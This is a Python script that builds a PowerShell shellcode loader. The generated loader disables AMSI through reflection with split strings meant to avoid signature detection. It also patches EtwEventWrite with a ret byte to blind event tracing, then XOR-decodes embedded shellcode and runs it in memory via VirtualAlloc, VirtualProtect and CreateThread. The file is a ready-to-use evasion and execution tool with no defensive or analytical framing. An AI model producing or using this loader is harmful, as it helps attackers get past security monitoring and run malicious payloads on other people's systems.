#!/usr/bin/env python3
"""Build a PowerShell shellcode loader with AMSI bypass + ETW patch + XOR-0xFA payload.

Usage:
    python3 make_ps_loader.py <sc.bin> <out.ps1>

Layers:
  1. AMSI bypass via reflection (split strings, no obvious signature)
  2. Add-Type with P/Invoke definitions (safe AFTER AMSI patched)
  3. ETW kill (patch EtwEventWrite with ret)
  4. Jitter sleep
  5. XOR-0xFA decrypt of shellcode (base64 in source -> raw bytes)
  6. VirtualAlloc RW -> Marshal.Copy -> VirtualProtect RX
  7. CreateThread + brief wait
"""
import sys
import base64

if len(sys.argv) != 3:
    print('usage: make_ps_loader.py <sc.bin> <out.ps1>')
    sys.exit(1)

sc = open(sys.argv[1], 'rb').read()
xored = bytes(b ^ 0xFA for b in sc)
b64 = base64.b64encode(xored).decode()

ps1 = '''# AMSI bypass (split-string reflection)
$a = 'Sys' + 'tem.Mana' + 'gement.Auto' + 'mation.'
$b = 'Am' + 'si'
$c = 'Utils'
$d = 'am' + 'si' + 'Init' + 'Failed'
$t = [Ref].Assembly.GetType($a + $b + $c)
if ($t) {
    $f = $t.GetField($d, 'NonPublic,Static')
    if ($f) { $f.SetValue($null, $true) }
}

# Define native P/Invoke (AMSI now bypassed; Add-Type body won't be scanned)
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class L {
    [DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, uint s, uint p, out uint o);
    [DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr t);
    [DllImport("kernel32")] public static extern uint WaitForSingleObject(IntPtr h, uint m);
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32", EntryPoint="GetModuleHandleA")] public static extern IntPtr GMH(string n);
}
"@

# ETW kill: 1-byte ret in EtwEventWrite
$ntdll = [L]::GMH('ntdll.dll')
$etw = [L]::GetProcAddress($ntdll, 'EtwEventWrite')
if ($etw -ne [IntPtr]::Zero) {
    $patch = [Byte[]](0xC3)
    $old = 0
    if ([L]::VirtualProtect($etw, [uint32]1, 0x40, [ref]$old)) {
        [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $etw, 1)
        [L]::VirtualProtect($etw, [uint32]1, $old, [ref]$old) | Out-Null
    }
}

# Jitter
Start-Sleep -Milliseconds (Get-Random -Minimum 800 -Maximum 2500)

# Decode shellcode (XOR 0xFA)
$enc = [System.Convert]::FromBase64String('__B64__')
for ($i = 0; $i -lt $enc.Length; $i++) { $enc[$i] = $enc[$i] -bxor 0xFA }

# Alloc RW, copy, RW->RX
$mem = [L]::VirtualAlloc([IntPtr]::Zero, [uint32]$enc.Length, 0x3000, 0x04)
[System.Runtime.InteropServices.Marshal]::Copy($enc, 0, $mem, $enc.Length)
$old2 = 0
[L]::VirtualProtect($mem, [uint32]$enc.Length, 0x20, [ref]$old2) | Out-Null
[Array]::Clear($enc, 0, $enc.Length)

# Fire-and-forget thread
$th = [L]::CreateThread([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
[L]::WaitForSingleObject($th, 500) | Out-Null
'''

ps1 = ps1.replace('__B64__', b64)
open(sys.argv[2], 'w').write(ps1)
print(f'OK: {len(sc)} bytes embedded ({len(b64)} b64) -> {sys.argv[2]}')
